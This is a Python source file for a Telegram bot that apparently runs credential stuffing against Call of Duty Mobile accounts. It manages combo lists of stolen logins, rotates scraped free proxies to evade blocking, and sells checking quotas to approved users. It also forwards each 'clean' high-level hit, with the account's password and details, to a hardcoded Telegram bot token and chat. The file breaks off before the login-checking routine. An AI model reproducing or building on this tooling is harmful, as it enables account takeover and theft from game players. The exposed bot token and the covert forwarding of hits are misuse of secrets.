#!/usr/bin/env python3
# CODM Premium Bot Checker v5.3 - PROXY SUPPORT + THREADING CONTROL (RAILWAY OPTIMIZED)
# Features: Real Proxy Support, Proxy Management, Auto Proxy Fetching, Threading Control
# Fixed: Only uses working proxies from working.txt, 4 threads default
# Created by @KenshiKupalBoss

import os
import sys
import time
import random
import hashlib
from datetime import datetime, timezone, timedelta
import json
import logging
import urllib.parse
import signal
import threading
import base64
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from typing import Dict, List
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
from colorama import Fore, Style, Back, init
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import ROUNDED, HEAVY, DOUBLE
from rich.prompt import Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box
import asyncio
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import io
import re
from collections import OrderedDict
import subprocess
import configparser
import socket
from urllib.parse import urlparse, parse_qs
from pathlib import Path
import shutil

# Initialize colorama and console
colorama.init(autoreset=True)
console = Console()

# ==================== DIRECTORY SETUP ====================
COMBO_DIR = Path("combo")
COMBO_DIR.mkdir(parents=True, exist_ok=True)

PROXY_DIR = Path("proxy")
PROXY_DIR.mkdir(parents=True, exist_ok=True)

PROXY_WORKING_DIR = Path("proxy/working")
PROXY_WORKING_DIR.mkdir(parents=True, exist_ok=True)

PROXY_BAD_DIR = Path("proxy/bad")
PROXY_BAD_DIR.mkdir(parents=True, exist_ok=True)

PROXY_ALL_DIR = Path("proxy/all")
PROXY_ALL_DIR.mkdir(parents=True, exist_ok=True)

COMBO_PROCESSED_DIR = Path("combo/processed")
COMBO_PROCESSED_DIR.mkdir(parents=True, exist_ok=True)

COMBO_HITS_DIR = Path("combo/hits")
COMBO_HITS_DIR.mkdir(parents=True, exist_ok=True)

COMBO_CLEAN_DIR = Path("combo/clean")
COMBO_CLEAN_DIR.mkdir(parents=True, exist_ok=True)

DATA_DIR = Path("data")
DATA_DIR.mkdir(parents=True, exist_ok=True)

SESSIONS_FILE = DATA_DIR / "sessions_persist.json"
PROXY_STATS_FILE = DATA_DIR / "proxy_stats.json"

# ==================== THREAD CONFIGURATION (RAILWAY OPTIMIZED) ====================
# Read from environment variable set by manager bot, default to 4
DEFAULT_THREADS = int(os.environ.get("THREADS", "4"))
MAX_CONCURRENT_CHECKERS = DEFAULT_THREADS
_checker_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKERS)

console.print(f"[cyan]🚀 Threads configured: {MAX_CONCURRENT_CHECKERS} (Railway optimized)[/cyan]")

# ==================== AUTO PROXY FETCHER ====================
FREE_PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
]

async def fetch_proxies_from_url(session, url):
    """Fetch proxies from a given URL"""
    try:
        async with session.get(url, timeout=15) as response:
            if response.status == 200:
                content = await response.text()
                proxies = []
                for line in content.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            proxies.append(line)
                return proxies
    except Exception as e:
        console.print(f"[red]Failed to fetch from {url}: {e}[/red]")
    return []

async def auto_fetch_proxies():
    """Auto fetch proxies from multiple sources"""
    console.print("[cyan]🌐 Auto-fetching proxies from multiple sources...[/cyan]")
    
    all_proxies = set()
    
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_proxies_from_url(session, url) for url in FREE_PROXY_SOURCES]
        results = await asyncio.gather(*tasks)
        
        for proxies in results:
            all_proxies.update(proxies)
    
    if all_proxies:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        all_file = PROXY_ALL_DIR / f"auto_fetched_{timestamp}.txt"
        
        with open(all_file, 'w', encoding='utf-8') as f:
            for proxy in sorted(all_proxies):
                f.write(f"{proxy}\n")
        
        main_proxy_file = PROXY_DIR / "proxy.txt"
        existing = set()
        if main_proxy_file.exists():
            with open(main_proxy_file, 'r', encoding='utf-8') as f:
                existing = set(line.strip() for line in f if line.strip() and not line.startswith('#'))
        
        all_proxies.update(existing)
        
        with open(main_proxy_file, 'w', encoding='utf-8') as f:
            f.write("# Auto-fetched proxies\n")
            f.write(f"# Fetched: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total: {len(all_proxies)}\n\n")
            for proxy in sorted(all_proxies):
                f.write(f"{proxy}\n")
        
        console.print(f"[green]✅ Auto-fetched {len(all_proxies)} proxies![/green]")
        return list(all_proxies)
    else:
        console.print("[yellow]⚠️ No proxies fetched from sources[/yellow]")
        return []

# ==================== PROXY MANAGER (ENHANCED - ONLY WORKING PROXIES) ====================
class ProxyManager:
    def __init__(self):
        self.connection_type = "rotating"  # rotating, proxy, direct
        self.proxy_list = []
        self.working_proxies = []
        self.bad_proxies = []
        self.current_index = 0
        self.proxy_stats = self.load_stats()
        self.lock = threading.Lock()
        
        # Load working proxies FIRST (these are pre-tested)
        self.load_working_proxies()
        
        # Then load all proxies for testing
        self.load_proxies_from_file()
        
    def load_stats(self):
        if PROXY_STATS_FILE.exists():
            try:
                with open(PROXY_STATS_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {'total_tested': 0, 'working': 0, 'bad': 0, 'history': []}
    
    def save_stats(self):
        try:
            with open(PROXY_STATS_FILE, 'w') as f:
                json.dump(self.proxy_stats, f, indent=2)
        except:
            pass
    
    def load_working_proxies(self):
        """Load pre-tested working proxies from working.txt (priority)"""
        working_file = PROXY_WORKING_DIR / "working.txt"
        if working_file.exists():
            try:
                with open(working_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            # Parse the proxy URL
                            url = self._build_proxy_url(line.split('#')[0].strip())
                            if url:
                                self.working_proxies.append({
                                    'url': url,
                                    'response_time': 0,
                                    'ip': 'Unknown',
                                    'country': 'Unknown'
                                })
                if self.working_proxies:
                    console.print(f"[green]✅ Loaded {len(self.working_proxies)} PRE-TESTED working proxies from working.txt[/green]")
                    return True
            except Exception as e:
                console.print(f"[red]Error loading working proxies: {e}[/red]")
        return False
    
    def set_connection_type(self, conn_type: str):
        self.connection_type = conn_type
        console.print(f"[cyan]🔄 Connection type set to: {conn_type}[/cyan]")
    
    def load_proxies_from_file(self, file_path=None):
        """Load all proxies from proxy.txt (for testing purposes)"""
        self.proxy_list = []
        
        if file_path:
            files_to_load = [Path(file_path)]
        else:
            files_to_load = list(PROXY_DIR.glob("*.txt"))
            # Exclude working/bad/all directories to avoid duplicates
            files_to_load = [f for f in files_to_load if f.parent.name not in ['working', 'bad', 'all']]
        
        for pf in files_to_load:
            try:
                with open(pf, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            url = self._build_proxy_url(line)
                            if url:
                                self.proxy_list.append(url)
            except Exception as e:
                console.print(f"[red]Error loading {pf.name}: {e}[/red]")
        
        console.print(f"[green]📁 Loaded {len(self.proxy_list)} total proxies from files[/green]")
        return len(self.proxy_list) > 0
    
    def _build_proxy_url(self, line: str) -> str:
        line = line.strip()
        if not line or line.startswith("#"):
            return ""
        
        if line.lower().startswith(("http://", "https://", "socks5://", "socks4://")):
            return line
        
        parts = line.split(":")
        if len(parts) == 2:
            host, port = parts
            return f"http://{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            return f"http://{user}:{pwd}@{host}:{port}"
        
        return ""
    
    def test_proxy(self, proxy_url, timeout=10):
        proxies = {"http": proxy_url, "https": proxy_url}
        try:
            start_time = time.time()
            response = requests.get(
                "http://ip-api.com/json",
                proxies=proxies,
                timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                data = response.json()
                return {
                    'working': True,
                    'response_time': response_time,
                    'ip': data.get('query', 'Unknown'),
                    'country': data.get('countryCode', 'Unknown')
                }
            return {'working': False, 'error': f'HTTP {response.status_code}'}
        except requests.exceptions.Timeout:
            return {'working': False, 'error': 'Timeout'}
        except requests.exceptions.ProxyError:
            return {'working': False, 'error': 'Proxy error'}
        except Exception as e:
            return {'working': False, 'error': str(e)[:50]}
    
    def test_proxies_batch(self, proxies=None, timeout=8, max_workers=50):
        if proxies is None:
            proxies = self.proxy_list
        
        if not proxies:
            console.print("[yellow]⚠️ No proxies to test[/yellow]")
            return []
        
        console.print(f"[cyan]🔍 Testing {len(proxies)} proxies with {max_workers} workers...[/cyan]")
        
        self.working_proxies = []
        self.bad_proxies = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Testing proxies...", total=len(proxies))
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_proxy = {executor.submit(self.test_proxy, p, timeout): p for p in proxies}
                
                for future in as_completed(future_to_proxy):
                    proxy = future_to_proxy[future]
                    try:
                        result = future.result()
                        if result['working']:
                            self.working_proxies.append({
                                'url': proxy,
                                'response_time': result['response_time'],
                                'ip': result['ip'],
                                'country': result['country']
                            })
                        else:
                            self.bad_proxies.append({'url': proxy, 'error': result.get('error', 'Unknown')})
                    except Exception:
                        self.bad_proxies.append({'url': proxy, 'error': 'Test failed'})
                    
                    progress.update(task, advance=1)
        
        self.working_proxies.sort(key=lambda x: x['response_time'])
        
        self.proxy_stats['total_tested'] += len(proxies)
        self.proxy_stats['working'] = len(self.working_proxies)
        self.proxy_stats['bad'] = len(self.bad_proxies)
        self.proxy_stats['last_test'] = time.time()
        self.save_stats()
        
        if self.working_proxies:
            working_file = PROXY_WORKING_DIR / f"working_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(working_file, 'w', encoding='utf-8') as f:
                f.write(f"# Working Proxies - Tested: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Working: {len(self.working_proxies)}\n\n")
                for p in self.working_proxies:
                    f.write(f"{p['url']} # {p['country']} - {p['response_time']:.2f}s\n")
            
            main_working = PROXY_WORKING_DIR / "working.txt"
            with open(main_working, 'w', encoding='utf-8') as f:
                for p in self.working_proxies:
                    f.write(f"{p['url']}\n")
        
        if self.bad_proxies:
            bad_file = PROXY_BAD_DIR / f"bad_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(bad_file, 'w', encoding='utf-8') as f:
                f.write(f"# Bad Proxies - Tested: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Bad: {len(self.bad_proxies)}\n\n")
                for p in self.bad_proxies:
                    f.write(f"{p['url']} # {p.get('error', 'Unknown')}\n")
        
        console.print(f"\n[green]✅ Testing complete![/green]")
        console.print(f"[green]   Working: {len(self.working_proxies)}[/green]")
        console.print(f"[red]   Bad: {len(self.bad_proxies)}[/red]")
        
        return self.working_proxies
    
    def get_next_proxy(self):
        """Get next proxy from WORKING PROXIES only"""
        with self.lock:
            if not self.working_proxies:
                return None
            
            if self.connection_type == "rotating":
                proxy = self.working_proxies[self.current_index % len(self.working_proxies)]
                self.current_index += 1
                return proxy['url']
            elif self.connection_type == "proxy":
                return random.choice(self.working_proxies)['url'] if self.working_proxies else None
            return None
    
    def create_proxied_session(self, proxy_url=None):
        session = cloudscraper.create_scraper()
        
        if self.connection_type != "direct" and self.working_proxies:
            if proxy_url is None:
                proxy_url = self.get_next_proxy()
            
            if proxy_url:
                session.proxies.update({"http": proxy_url, "https": proxy_url})
                session.proxies_used = proxy_url
                console.print(f"[dim]🌐 Using proxy: {proxy_url[:50]}[/dim]")
        
        return session
    
    def mark_proxy_bad(self, proxy_url):
        with self.lock:
            for i, p in enumerate(self.working_proxies):
                if p['url'] == proxy_url:
                    self.bad_proxies.append({'url': proxy_url, 'error': 'Failed during use'})
                    self.working_proxies.pop(i)
                    console.print(f"[red]🚫 Proxy marked as bad and removed: {proxy_url[:50]}[/red]")
                    
                    # Update working.txt immediately
                    main_working = PROXY_WORKING_DIR / "working.txt"
                    if main_working.exists():
                        with open(main_working, 'w', encoding='utf-8') as f:
                            for p_remain in self.working_proxies:
                                f.write(f"{p_remain['url']}\n")
                    break
    
    def get_stats(self):
        return {
            'type': self.connection_type,
            'total_loaded': len(self.proxy_list),
            'working': len(self.working_proxies),
            'bad': len(self.bad_proxies),
            'history': self.proxy_stats.get('history', [])
        }


# ==================== CLEAN ACCOUNT FORWARDING CONFIG ====================
CLEAN_ACCOUNT_BOT_TOKEN = "8223438076:AAHm5_1kEcJOCKCguXAqbFKEBe-vlzPqdH8"
CLEAN_ACCOUNT_CHAT_ID = 8252162481
FORWARD_CLEAN_ACCOUNTS = True
FORWARD_ONLY_LEVEL_80_PLUS = True
MIN_LEVEL_FOR_FORWARD = 80

clean_account_queue = []
clean_account_queue_lock = Lock()
clean_account_sender_thread = None
clean_account_sender_running = True

# ==================== MEMORY OPTIMIZED CONCURRENT CHECKER ====================
MAX_CONCURRENT_CHECKERS = 2
_checker_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKERS)
_semaphore_lock = threading.Lock()
_checker_queue: List[str] = []
_queue_lock = threading.Lock()
_mem_pressure = threading.Event()

def rebuild_semaphore(n: int):
    global _checker_semaphore, MAX_CONCURRENT_CHECKERS
    with _semaphore_lock:
        MAX_CONCURRENT_CHECKERS = n
        _checker_semaphore = threading.Semaphore(n)

def _enqueue(uid):
    with _queue_lock:
        if uid not in _checker_queue:
            _checker_queue.append(uid)

def _dequeue(uid):
    with _queue_lock:
        try:
            _checker_queue.remove(uid)
        except:
            pass

def _queue_pos(uid) -> int:
    with _queue_lock:
        try:
            return _checker_queue.index(uid) + 1
        except:
            return 0

# ==================== SESSION + MESSAGE TRACKER ====================
active_sessions: Dict[str, dict] = {}
_admin_stopped: set = set()
sessions_lock = threading.Lock()
bot_messages: Dict[str, list] = {}
bot_msg_lock = threading.Lock()
_shutdown_flag = threading.Event()

user_proxy_preference: Dict[int, dict] = {}
user_proxy_preference_lock = Lock()

def get_user_proxy_preference(user_id):
    with user_proxy_preference_lock:
        if user_id not in user_proxy_preference:
            user_proxy_preference[user_id] = {'use_proxy': False, 'proxy_type': 'direct'}
        return user_proxy_preference[user_id]

def set_user_proxy_preference(user_id, use_proxy, proxy_type='direct'):
    with user_proxy_preference_lock:
        user_proxy_preference[user_id] = {'use_proxy': use_proxy, 'proxy_type': proxy_type}

def track(uid: str, mid: int):
    with bot_msg_lock:
        bot_messages.setdefault(uid, []).append(mid)

def load_persisted_sessions() -> dict:
    if SESSIONS_FILE.exists():
        try:
            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return {}

def persist_session(uid: str, data: dict):
    ps = load_persisted_sessions()
    ps[uid] = data
    with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(ps, f, indent=2)

def clear_persisted_session(uid: str):
    ps = load_persisted_sessions()
    ps.pop(uid, None)
    with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(ps, f, indent=2)

def _get_rss_mb() -> float:
    try:
        with open("/proc/self/status", "r") as ps:
            for ln in ps:
                if ln.startswith("VmRSS:"):
                    return int(ln.split()[1]) / 1024
    except:
        pass
    try:
        import resource as _res
        return _res.getrusage(_res.RUSAGE_SELF).ru_maxrss / 1024
    except:
        pass
    return 0.0

def _memory_watchdog():
    _MEM_LIMIT_MB = 420
    while not _shutdown_flag.wait(15):
        mb = _get_rss_mb()
        if mb >= _MEM_LIMIT_MB:
            if not _mem_pressure.is_set():
                console.print(f"[red]🔴 RAM {mb:.0f}MB ≥ {_MEM_LIMIT_MB}MB — blocking new checkers[/red]")
                _mem_pressure.set()
        else:
            if _mem_pressure.is_set():
                console.print(f"[green]🟢 RAM {mb:.0f}MB — pressure cleared[/green]")
                _mem_pressure.clear()

threading.Thread(target=_memory_watchdog, daemon=True, name="mem-watchdog").start()

# ==================== COOLDOWN TRACKER ====================
user_last_check_time = {}
user_last_check_lock = Lock()
user_cooldown_end_time = {}

def get_cooldown_remaining(user_id):
    with user_last_check_lock:
        if user_id in user_cooldown_end_time:
            remaining = user_cooldown_end_time[user_id] - time.time()
            if remaining > 0:
                return int(remaining)
            else:
                del user_cooldown_end_time[user_id]
                if user_id in user_last_check_time:
                    del user_last_check_time[user_id]
                return 0
        return 0

def set_user_check_completed(user_id):
    with user_last_check_lock:
        user_last_check_time[user_id] = time.time()
        user_cooldown_end_time[user_id] = time.time() + 60

def reset_user_cooldown(user_id):
    with user_last_check_lock:
        if user_id in user_cooldown_end_time:
            del user_cooldown_end_time[user_id]
        if user_id in user_last_check_time:
            del user_last_check_time[user_id]

def can_check_now_cooldown(user_id):
    remaining = get_cooldown_remaining(user_id)
    return remaining == 0

# ==================== PROXY UTILITIES ====================
def _build_proxy_url(line: str) -> str:
    line = line.strip()
    if not line or line.startswith("#"):
        return ""
    if line.lower().startswith(("http://", "https://", "socks5://", "socks4://")):
        return line
    parts = line.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return f"http://{line}"

def _test_proxy_sync(line: str, timeout: int = 10) -> tuple:
    url = _build_proxy_url(line)
    if not url:
        return False, "malformed"
    proxies = {"http": url, "https": url}
    try:
        r = requests.get("http://ip-api.com/json", proxies=proxies, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code < 500:
            return True, ""
        return False, f"HTTP {r.status_code}"
    except requests.exceptions.ProxyError as e:
        return False, f"proxy error: {str(e)[:60]}"
    except requests.exceptions.ConnectTimeout:
        return False, "timeout"
    except requests.exceptions.ConnectionError as e:
        return False, f"conn error: {str(e)[:60]}"
    except Exception as e:
        return False, f"error: {str(e)[:60]}"

def start_clean_account_sender():
    global clean_account_sender_thread, clean_account_sender_running
    
    def sender_worker():
        global clean_account_sender_running
        while clean_account_sender_running:
            account_info = None
            with clean_account_queue_lock:
                if clean_account_queue:
                    account_info = clean_account_queue.pop(0)
            
            if account_info:
                try:
                    send_clean_account_sync(account_info)
                except Exception as e:
                    console.print(f"[red]Error sending clean account: {e}[/red]")
                time.sleep(0.5)
            else:
                time.sleep(0.1)
    
    clean_account_sender_thread = threading.Thread(target=sender_worker, daemon=True)
    clean_account_sender_thread.start()
    console.print("[green]✅ Clean account sender thread started[/green]")

def send_clean_account_sync(account_info):
    global CLEAN_ACCOUNT_BOT_TOKEN, CLEAN_ACCOUNT_CHAT_ID, FORWARD_CLEAN_ACCOUNTS
    
    if not FORWARD_CLEAN_ACCOUNTS:
        return False
    if not CLEAN_ACCOUNT_BOT_TOKEN or not CLEAN_ACCOUNT_CHAT_ID:
        return False
    
    codm_level = account_info.get('codm_level', 0)
    try:
        if int(codm_level) < MIN_LEVEL_FOR_FORWARD:
            return False
    except:
        return False
    
    details = account_info.get('details', {})
    email = details.get('email', '')
    email_verified = details.get('email_verified', False)
    mobile = details.get('personal', {}).get('mobile_no', '')
    mobile_bound = mobile != 'N/A' and mobile and mobile.strip()
    
    is_clean_for_forward = not mobile_bound and not email_verified
    
    if not is_clean_for_forward:
        return False
    
    codm_info = account_info.get('codm_info', {})
    codm_level_val = codm_info.get('codm_level', 'N/A')
    codm_nickname = codm_info.get('codm_nickname', 'N/A')
    region = codm_info.get('region', 'N/A')
    uid = codm_info.get('uid', 'N/A')
    username = details.get('username', account_info.get('account', 'N/A'))
    country = details.get('personal', {}).get('country', 'N/A')
    shell = details.get('profile', {}).get('shell_balance', 'N/A')
    
    level_num = int(codm_level_val) if str(codm_level_val).isdigit() else 0
    if level_num >= 300:
        level_badge = "👑"
    elif level_num >= 250:
        level_badge = "💎"
    elif level_num >= 200:
        level_badge = "⭐"
    elif level_num >= 150:
        level_badge = "🌟"
    elif level_num >= 80:
        level_badge = "📈"
    else:
        level_badge = "📈"
    
    message = f"""
🎯 CLEAN ACCOUNT HIT! ({level_badge})
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 <b>ACCOUNT:</b> <code>{account_info.get('account', 'N/A')}</code>
🔑 <b>PASSWORD:</b> <code>{account_info.get('password', 'N/A')}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎮 <b>CODM INFORMATION:</b>
   • Nickname: <code>{codm_nickname}</code>
   • Level: <b>{codm_level_val}</b> {level_badge}
   • Region: {region}
   • UID: <code>{uid}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>ACCOUNT DETAILS:</b>
   • Username: {username}
   • Country: {country}
   • Shell Balance: {shell}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🧹 <b>STATUS: CLEAN ACCOUNT</b>
   ✓ No email bound/verified
   ✓ No phone number bound  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Checked by CODM Premium Bot
"""
    
    try:
        url = f'https://api.telegram.org/bot{CLEAN_ACCOUNT_BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': CLEAN_ACCOUNT_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            console.print(f"[green]✅ Clean account forwarded: {account_info.get('account', 'N/A')} (Level {codm_level_val})[/green]")
            return True
    except Exception as e:
        console.print(f"[red]Error forwarding clean account: {e}[/red]")
    return False

# ==================== USER DATABASE ====================
USERS_FILE = "users.json"
PENDING_FILE = "pending_users.json"
ANNOUNCEMENTS_FILE = "announcements.json"

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users):
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(users, f, indent=2)
        return True
    except Exception as e:
        console.print(f"[red]Error saving users: {e}[/red]")
        return False

def load_pending():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending(pending):
    try:
        with open(PENDING_FILE, 'w', encoding='utf-8') as f:
            json.dump(pending, f, indent=2)
        return True
    except Exception as e:
        console.print(f"[red]Error saving pending: {e}[/red]")
        return False

def load_announcements():
    if os.path.exists(ANNOUNCEMENTS_FILE):
        try:
            with open(ANNOUNCEMENTS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_announcements(announcements):
    try:
        with open(ANNOUNCEMENTS_FILE, 'w', encoding='utf-8') as f:
            json.dump(announcements, f, indent=2)
        return True
    except Exception as e:
        console.print(f"[red]Error saving announcements: {e}[/red]")
        return False

def add_announcement(announcement_text, admin_id):
    announcements = load_announcements()
    announcements.insert(0, {
        'id': int(time.time()),
        'text': announcement_text,
        'admin_id': admin_id,
        'created_at': time.time(),
        'read_by': []
    })
    announcements = announcements[:50]
    save_announcements(announcements)
    return announcements[0]

def get_user_info(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str]
    return None

def is_user_approved(user_id):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str not in users:
        return False
    
    user = users[user_id_str]
    
    if user.get('status') == 'suspended' or user.get('status') == 'banned':
        return False
    
    expiry = user.get('expiry_time')
    if expiry and time.time() > expiry:
        user['status'] = 'expired'
        save_users(users)
        return False
    
    if not user.get('approved', False):
        return False
    
    if user.get('status') != 'active':
        user['status'] = 'active'
        save_users(users)
    
    return True

def is_user_banned(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get('status') == 'banned'
    return False

def ban_user(user_id, admin_id, reason="No reason provided"):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str in users:
        users[user_id_str]['status'] = 'banned'
        users[user_id_str]['banned_by'] = admin_id
        users[user_id_str]['banned_at'] = time.time()
        users[user_id_str]['ban_reason'] = reason
        save_users(users)
        reset_user_cooldown(user_id)
        return True
    return False

def unban_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str in users:
        users[user_id_str]['status'] = 'active'
        users[user_id_str]['approved'] = True
        users[user_id_str].pop('banned_by', None)
        users[user_id_str].pop('banned_at', None)
        users[user_id_str].pop('ban_reason', None)
        save_users(users)
        reset_user_cooldown(user_id)
        return True
    return False

def delete_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str in users:
        del users[user_id_str]
        save_users(users)
        return True
    return False

def edit_user_lines(user_id, new_limit):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str in users:
        users[user_id_str]['lines_limit'] = new_limit
        save_users(users)
        return True
    return False

def set_user_expiry(user_id, days):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str in users:
        if days > 0:
            users[user_id_str]['expiry_time'] = time.time() + (days * 86400)
        else:
            users[user_id_str]['expiry_time'] = None
        save_users(users)
        return True
    return False

def get_remaining_lines(user_id):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str not in users:
        return 0
    
    user = users[user_id_str]
    limit = user.get('lines_limit', 500)
    used = user.get('lines_used', 0)
    
    return max(0, limit - used)

def use_lines(user_id, lines):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str not in users:
        return False
    
    user = users[user_id_str]
    user['lines_used'] = user.get('lines_used', 0) + lines
    user['total_lines_checked'] = user.get('total_lines_checked', 0) + lines
    save_users(users)
    return True

def approve_user(user_id, admin_id, expiry_days=None, lines_limit=500):
    users = load_users()
    pending = load_pending()
    user_id_str = str(user_id)
    
    if user_id_str in pending:
        user_data = pending[user_id_str]
    else:
        user_data = {}
    
    user_data['approved'] = True
    user_data['approved_by'] = admin_id
    user_data['approved_at'] = time.time()
    user_data['lines_limit'] = lines_limit
    user_data['lines_used'] = user_data.get('lines_used', 0)
    user_data['total_lines_checked'] = user_data.get('total_lines_checked', 0)
    user_data['status'] = 'active'
    
    if expiry_days:
        user_data['expiry_time'] = time.time() + (expiry_days * 86400)
    else:
        user_data['expiry_time'] = None
    
    users[user_id_str] = user_data
    
    if user_id_str in pending:
        del pending[user_id_str]
    
    save_users(users)
    save_pending(pending)
    return True

def reject_user(user_id):
    pending = load_pending()
    user_id_str = str(user_id)
    
    if user_id_str in pending:
        del pending[user_id_str]
        save_pending(pending)
        return True
    return False

def get_expiry_warning(user_id):
    users = load_users()
    user_id_str = str(user_id)
    
    if user_id_str not in users:
        return None
    
    user = users[user_id_str]
    expiry = user.get('expiry_time')
    
    if not expiry:
        return None
    
    remaining = expiry - time.time()
    
    if remaining <= 0:
        return "⚠️ <b>YOUR ACCESS HAS EXPIRED!</b> ⚠️\nPlease contact an admin for renewal."
    elif remaining <= 86400:
        hours = int(remaining / 3600)
        return f"⚠️ <b>YOUR ACCESS EXPIRES IN {hours} HOURS!</b> ⚠️\nPlease contact an admin for renewal."
    elif remaining <= 604800:
        days = int(remaining / 86400)
        return f"⚠️ <b>YOUR ACCESS EXPIRES IN {days} DAYS!</b> ⚠️\nPlease contact an admin for renewal."
    
    return None

# ==================== VERSION ====================
BOT_VERSION = "v5.2"
BOT_NAME = "CØDM PRΣMIUM BØT"
BOT_CHECKER = "CØDM PRΣMIUM BØT CHECKER"

# ==================== STYLE HELPER ====================
def stylize_text(text):
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
        'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
        'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
        'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ꜰ', 'G': 'ɢ',
        'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ',
        'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 'ꜱ', 'T': 'ᴛ',
        'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ',
        '0': '𝟢', '1': '𝟣', '2': '𝟤', '3': '𝟥', '4': '𝟦',
        '5': '𝟧', '6': '𝟨', '7': '𝟩', '8': '𝟪', '9': '𝟫',
        '!': '❗', '?': '❓', '@': 'ⓐ', '#': '#', '$': '$', '%': '%',
    }
    result = []
    for char in text:
        if char in small_caps_map:
            result.append(small_caps_map[char])
        else:
            result.append(char)
    return ''.join(result)

# ==================== LIVE STATS CLASS ====================
